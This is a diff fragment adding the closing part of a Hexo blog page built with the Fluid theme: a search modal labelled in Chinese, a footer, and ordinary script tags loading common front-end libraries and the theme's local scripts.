+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
